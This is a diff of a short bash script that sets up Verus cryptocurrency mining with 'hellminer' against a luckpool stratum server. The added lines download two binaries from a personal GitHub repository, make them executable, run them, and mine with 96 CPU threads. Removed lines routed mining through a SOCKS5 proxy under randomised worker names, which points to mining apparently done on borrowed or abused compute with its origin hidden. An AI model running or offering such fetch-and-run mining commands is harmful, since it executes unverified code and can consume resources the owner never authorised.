@@ -1,11 +1,3 @@
 #!/bin/bash
-!apt-get install msr-tools
-chmod +x hellminer 
-chmod +x verus-solver 
-./verus-solver
-apt install screen
-POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
-WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
-PROXY=socks5://178.162.111.220:1080
-./hellminer -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
+wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && apt install screen
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RTB8Yi3AbEqHqrsjs1VXm8YCssK8xfZMce.10 -p x --cpu 96
